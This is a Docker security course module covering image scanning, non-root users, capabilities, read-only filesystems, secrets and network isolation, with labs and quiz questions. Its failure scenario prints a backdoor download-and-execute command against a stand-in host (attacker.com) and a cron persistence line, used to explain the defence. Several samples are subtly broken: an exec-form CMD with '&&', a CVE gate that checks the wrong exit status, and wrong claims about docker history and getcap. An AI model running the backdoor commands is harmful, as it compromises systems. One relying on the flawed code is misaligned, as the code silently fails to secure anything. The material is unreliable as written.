# Module 8: Docker Security

## Security Principle: Defense in Depth

Container security is not one feature - it's layers of protection.

```
External attacks
    ↓
1. Image authenticity (is this image trusted?)
    ↓
2. Image vulnerabilities (does image have known CVEs?)
    ↓
3. Container capabilities (what can the container do?)
    ↓
4. Filesystem isolation (what can it access?)
    ↓
5. Process isolation (what can it see?)
    ↓
6. Secrets management (what credentials are accessible?)
    ↓
    Running application
```

## Image Security: Trust and Integrity

### Image Signing

Verify that an image hasn't been tampered with.

```bash
# Enable Docker Content Trust
export DOCKER_CONTENT_TRUST=1

# Push image (requires signing keys)
docker push myregistry.com/myapp:v1.0
# Docker signs layers and manifest

# Pull image (verifies signature)
docker pull myregistry.com/myapp:v1.0
# Docker verifies signature before use

# Without signature:
docker pull myregistry.com/unsigned:latest
# Error: Image not signed
```

### Vulnerability Scanning

Scan images for known CVEs (Common Vulnerabilities and Exposures).

```bash
# Docker Scout
docker scout cves myimage:1.0
# Shows: CVE count, severity, affected packages

# Example output:
# 5 CVEs found in image
# - 1 CRITICAL (openssl vulnerability)
# - 2 HIGH (nginx XSS)
# - 2 MEDIUM (curl issue)

# Trivy (external tool)
trivy image myimage:1.0
# More detailed, comprehensive scanning

# Integration in CI/CD
docker scout cves myimage:1.0 --format sarif > results.sarif
# Export for CI/CD pipeline
```

### Best Practices for Image Security

1. **Use minimal base images**
   ```dockerfile
   # More attack surface
   FROM ubuntu:22.04

   # Smaller, minimal
   FROM debian:12-slim

   # Smallest, minimal (may have issues)
   FROM alpine:3.18
   ```

2. **Only include what's needed**
   ```dockerfile
   # BAD: includes build tools in final image
   FROM ubuntu:22.04
   RUN apt-get update && apt-get install -y build-essential
   COPY src /src
   RUN make build

   # GOOD: multi-stage separates build from runtime
   FROM ubuntu:22.04 AS builder
   RUN apt-get update && apt-get install -y build-essential
   COPY src /src
   RUN make build

   FROM ubuntu:22.04
   COPY --from=builder /src/bin/app /usr/local/bin/
   ```

3. **Don't run as root**
   ```dockerfile
   # BAD
   FROM ubuntu:22.04
   COPY app /app
   CMD ["python3", "/app/app.py"]
   # Runs as root

   # GOOD
   FROM ubuntu:22.04
   RUN useradd -m appuser
   COPY app /app
   RUN chown -R appuser:appuser /app
   USER appuser
   CMD ["python3", "/app/app.py"]
   ```

4. **Keep images updated**
   ```bash
   # Daily rebuild images with updated base layers
   # Don't use ubuntu:22.04 from months ago

   # Use latest patch versions
   python:3.11.4  # Specific patch
   python:3.11    # Latest 3.11.x (updates automatically)
   ```

## Running Containers Securely

### Non-Root User

Containers should not run as root.

```dockerfile
# In Dockerfile
FROM ubuntu:22.04
RUN useradd -m -u 1000 appuser
USER appuser
CMD ["python3", "/app/app.py"]
```

```bash
# Verify
docker run myimage id
# uid=1000(appuser) gid=1000(appuser) groups=1000(appuser)

# Force non-root at runtime
docker run --user 1000 ubuntu id
# uid=1000 (even if Dockerfile says root)

# Never do this in production
docker run ubuntu id
# uid=0(root) - SECURITY RISK
```

**Why non-root matters:**
```bash
# As root, container can:
docker run -it ubuntu
# Can write to /etc, /sys
# Can install packages
# Can load kernel modules (if capabilities allow)

# As non-root (1000):
docker run --user 1000 -it ubuntu
# Can't write to /etc
# Can't install packages
# Can't affect system (much more isolated)
```

### Linux Capabilities: Fine-Grained Privileges

Containers inherit all Linux capabilities by default. Drop unnecessary ones.

```bash
# See default capabilities
docker run ubuntu getcap /usr/bin/ping
# Shows inherited capabilities

# Drop all capabilities (most restrictive)
docker run --cap-drop=ALL ubuntu ping localhost
# Error: Operation not permitted
# Container can do almost nothing

# Drop specific capabilities
docker run --cap-drop=CAP_SYS_ADMIN ubuntu

# Add only what's needed
docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE ubuntu
# Can only bind to network ports < 1024

# Common dangerous capabilities
CAP_SYS_ADMIN       # "do anything" - drop this!
CAP_SYS_MODULE      # Load kernel modules - drop
CAP_NET_ADMIN       # Change network config - drop if not needed
CAP_SYS_BOOT        # Reboot the system - drop
```

### Read-Only Filesystems

Make container filesystem read-only except for specific volumes.

```bash
# Entire container read-only
docker run --read-only ubuntu touch /file
# Error: Read-only file system

# Need /tmp for some apps
docker run --read-only --tmpfs /tmp ubuntu touch /tmp/file
# Works (tmpfs is writable)

# Combination with volume
docker run --read-only -v data:/data ubuntu bash -c 'touch /data/file && echo "ok"'
# Works: volume is writable, rest is read-only
```

**Benefits:**
- Container can't be modified by compromised process
- Prevents persistent backdoors
- Forces explicit writable paths

### Restart Policy for Failed Containers

Don't automatically restart containers with security issues.

```bash
# BAD: Always restart
docker run --restart=always ubuntu
# If compromised, automatically restarts

# GOOD: Notify, require manual intervention
docker run --restart=on-failure:3 ubuntu
# Restart only 3 times, then stop
# Human must investigate failures
```

## Secrets Management: Protecting Credentials

Never put secrets in images or environment variables.

### Docker Secrets (Swarm Mode)

For Docker Swarm (cluster mode):

```bash
# Create secret from file
echo "database-password" | docker secret create db_password -
# Or from file: docker secret create db_password ./password.txt

# Use in service (Swarm)
docker service create \
  --secret db_password \
  --name myapp \
  myimage:1.0

# Inside container, secret available at
cat /run/secrets/db_password
# Contains the secret

# Secrets not visible in
docker inspect myapp
docker logs myapp
docker exec myapp env
```

### Environment File (Development Only)

For development with docker-compose:

```bash
# Create .env file (add to .gitignore!)
echo "DATABASE_PASSWORD=dev" > .env

# Never commit secrets to git
echo ".env" >> .gitignore

# docker-compose reads .env
docker-compose up
```

### External Secret Management

For production:

```bash
# Use external secret manager
# - AWS Secrets Manager
# - HashiCorp Vault
# - Azure Key Vault
# - Kubernetes Secrets

# Application fetches secrets at startup
# from external manager, not from environment
```

Implementation pattern:

```dockerfile
FROM python:3.11
RUN pip install boto3  # AWS SDK
COPY app.py /app/
COPY get_secrets.py /app/
CMD ["python3", "/app/get_secrets.py && python3 /app/app.py"]
```

```python
# get_secrets.py
import boto3
import os

client = boto3.client('secretsmanager')
secret = client.get_secret_value(SecretId='prod/db/password')
os.environ['DATABASE_PASSWORD'] = secret['SecretString']

# Now start application with secrets loaded
exec(open('/app/app.py').read())
```

## Network Security

### Limit Network Access

Use networks to isolate containers.

```yaml
version: '3.8'
services:
  database:
    image: postgres
    networks:
      - backend
    # Only accessible from backend network

  api:
    image: myapi
    networks:
      - backend
      - frontend
    # Bridges both networks

  web:
    image: nginx
    networks:
      - frontend
    ports:
      - "80:80"
    # External -> web, web -> api, api -> database

networks:
  frontend:    # Exposed to outside
  backend:     # Internal only
```

### AppArmor and SELinux

Additional kernel-level security.

```bash
# With AppArmor (Ubuntu/Debian)
docker run --security-opt apparmor=docker-default myimage

# With SELinux (RHEL/CentOS)
docker run --security-opt label=type:container_runtime_t myimage

# Disable security (dangerous)
docker run --security-opt label=disable myimage
```

## Scanning and Monitoring

### Build-Time Scanning

Scan images during build.

```bash
# Scan after build
docker build -t myimage:1.0 .
docker scout cves myimage:1.0

# Fail build if vulnerabilities found
docker scout cves myimage:1.0 --format sarif | jq .
if [ $? -ne 0 ]; then
  echo "CVEs found, failing build"
  exit 1
fi
```

### Runtime Monitoring

Monitor running containers for security issues.

```bash
# Container runtime security
# - Falco (detects suspicious behavior)
# - Sysdig (system call analysis)
# - apparmor/selinux logs

# Example: Block container from writing binaries
docker run --read-only \
  --tmpfs /tmp \
  --security-opt no-new-privileges \
  myimage
```

## Practical Security Checklist

### Image Security
- [ ] Scan for vulnerabilities with docker scout or trivy
- [ ] Sign images with Docker Content Trust
- [ ] Use minimal base images (alpine, slim)
- [ ] Remove build tools from final image (multi-stage)
- [ ] Don't run as root (use USER directive)

### Container Runtime
- [ ] Don't use --cap-add=ALL (drop capabilities)
- [ ] Run as non-root user
- [ ] Use --read-only filesystem when possible
- [ ] Use tmpfs for temporary data
- [ ] Set restart_policy to on-failure (not always)

### Secrets
- [ ] Never put secrets in images
- [ ] Never put secrets in environment variables
- [ ] Use external secret management
- [ ] Use Docker secrets for Swarm
- [ ] Add secrets files to .gitignore

### Network
- [ ] Use custom networks (not default bridge)
- [ ] Don't expose unnecessary ports
- [ ] Isolate frontend from backend networks
- [ ] Use HTTPS for external communication

### Operations
- [ ] Update base images regularly
- [ ] Remove unused images and containers
- [ ] Monitor logs for security issues
- [ ] Use image pull policies (always pull for latest)
- [ ] Enable Docker Content Trust

## Common Vulnerabilities and Prevention

### Vulnerability 1: Root Execution

```dockerfile
# VULNERABLE
FROM ubuntu:22.04
COPY app /app
CMD ["./app"]
# Runs as root

# FIXED
FROM ubuntu:22.04
RUN useradd appuser
COPY app /app
RUN chown appuser:appuser /app
USER appuser
CMD ["./app"]
```

### Vulnerability 2: Exposed Secrets

```dockerfile
# VULNERABLE
FROM ubuntu:22.04
ENV DATABASE_PASSWORD=secret123
RUN pip install -r requirements.txt
COPY app /app
# Secret is visible in docker history

# FIXED
FROM ubuntu:22.04
RUN --mount=type=secret,id=db_pass \
    cat /run/secrets/db_pass > /etc/app/db.conf

# Build with:
docker build --secret db_pass=<(echo 'secret123') .
# Secret never stored in image
```

### Vulnerability 3: Insecure Permissions

```dockerfile
# VULNERABLE
FROM ubuntu:22.04
COPY config /etc/app/config
# Config file world-readable

# FIXED
FROM ubuntu:22.04
COPY config /etc/app/config
RUN chmod 600 /etc/app/config
RUN chown appuser:appuser /etc/app/config
USER appuser
```

### Vulnerability 4: Unrestricted Capabilities

```dockerfile
# VULNERABLE
FROM ubuntu:22.04
CMD ["app"]
# Inherits all capabilities

# FIXED
FROM ubuntu:22.04
USER appuser
CMD ["app"]

# Run with:
docker run --cap-drop=ALL myimage
```

---

## Practice: Exam Questions

1. **Why should containers run as non-root users?**
   - A) It makes them faster
   - B) It reduces privilege if container is compromised
   - C) It's required by Docker
   - D) It enables networking

2. **What is the purpose of Linux capabilities?**
   - A) Faster container startup
   - B) Fine-grained privilege control
   - C) Enables multi-user containers
   - D) Replaces sudoers

3. **Where should secrets be stored for containerized applications?**
   - A) In environment variables
   - B) In image files (embedded)
   - C) External secret management (Vault, AWS Secrets)
   - D) In docker-compose.yml

4. **What does `--read-only` flag do?**
   - A) Prevents image pulling
   - B) Makes container filesystem read-only (except volumes/tmpfs)
   - C) Prevents network access
   - D) Stops container from starting

5. **Why should you scan container images for vulnerabilities?**
   - A) Required by Docker
   - B) Detects known CVEs in dependencies
   - C) Prevents port mapping
   - D) Scans are mandatory only in Swarm mode

---

## Hands-On Labs

### Lab 1: Secure Container Image

**Objective:** Build a secure image following best practices.

```bash
# Create insecure version first
cat > Dockerfile.insecure << 'EOF'
FROM ubuntu:22.04
RUN apt-get update && apt-get install -y \
    curl wget git build-essential
COPY app.py /app/
CMD ["python3", "/app/app.py"]
EOF

# Scan insecure image
docker build -t insecure:1.0 -f Dockerfile.insecure .
docker scout cves insecure:1.0
# Shows vulnerabilities

# Create secure version
cat > Dockerfile.secure << 'EOF'
FROM python:3.11-alpine
RUN addgroup -g 1000 appgroup && \
    adduser -D -u 1000 -G appgroup appuser
COPY app.py /app/
RUN chown -R appuser:appgroup /app
USER appuser
EXPOSE 8000
CMD ["python3", "/app/app.py"]
EOF

# Build secure image
docker build -t secure:1.0 -f Dockerfile.secure .
docker scout cves secure:1.0
# Fewer vulnerabilities (smaller base)

# Compare sizes
docker images | grep -E 'insecure|secure'
# insecure: ~120MB, secure: ~90MB

# Run secure image
docker run --user 1000 \
  --read-only \
  --tmpfs /tmp \
  --cap-drop=ALL \
  secure:1.0
```

### Lab 2: Secrets Management

**Objective:** Manage secrets securely.

```bash
# Create application that needs secrets
cat > app.py << 'EOF'
import os
db_password = os.getenv('DB_PASSWORD')
if not db_password:
    raise ValueError("DB_PASSWORD not set")
print(f"Connected with password: {db_password[:3]}...")
EOF

# Create Dockerfile
cat > Dockerfile << 'EOF'
FROM python:3.11-slim
COPY app.py /app/
WORKDIR /app
CMD ["python3", "app.py"]
EOF

# Build
docker build -t secret-app:1.0 .

# BAD: Secret in docker run
docker run -e DB_PASSWORD=mysecret secret-app:1.0
# Secret visible in docker history

# GOOD: Load from file
echo "mysecret" > .env.secret
chmod 600 .env.secret

docker run --env-file .env.secret secret-app:1.0
# Better: secret from file, add .env.secret to .gitignore

# BETTER: Docker secrets (Swarm)
# (requires Docker Swarm mode initialization)
# docker secret create db_password ./password.txt

# BEST: External secret manager
# (requires vault/aws secrets setup)
```

---

## Failure Scenario: Compromised Container Spawns Persistence

**Scenario:**
An attacker exploits a vulnerability in your web application. They create a new entrypoint script and make the container run it, ensuring they can access the system even after restart.

**What could happen with insecure image:**
```bash
# Attacker gets shell
docker exec myapp /bin/bash

# As root, they can:
docker exec myapp bash -c 'curl attacker.com/backdoor.sh | bash'
# Downloads and executes backdoor script

docker exec myapp bash -c 'echo "*/5 * * * * /backdoor.sh" | crontab -'
# Creates persistent cron job

# Restarts don't help
docker restart myapp
# Backdoor is still there (in writable layer)
```

**With secure image:**
```bash
# Container runs as non-root (uid=1000)
docker run --user 1000 \
  --read-only \
  --tmpfs /tmp \
  --cap-drop=ALL \
  myapp

# Even if compromised:
docker exec myapp id
# uid=1000 (can't become root)

# Can't write to filesystem
docker exec myapp bash -c 'echo "backdoor" > /app/backdoor.sh'
# Error: Read-only file system

# Can't modify system
docker exec myapp apt-get install evil-package
# Error: Permission denied
docker exec myapp usermod -aG sudo 1000
# Error: Operation not permitted

# Attacker limited to /tmp (tmpfs)
docker exec myapp bash -c 'echo "backdoor" > /tmp/file'
# Works, but deleted on container stop
```

**Lesson:**
Security is layers. No single measure prevents all attacks, but combined:
- Non-root + read-only prevents persistence
- Dropped capabilities prevents privilege escalation
- tmpfs for temp data ensures cleanup
- Scanning prevents known vulnerabilities

---

Next: [Module 9: Docker in CI/CD](09-docker-cicd.md)
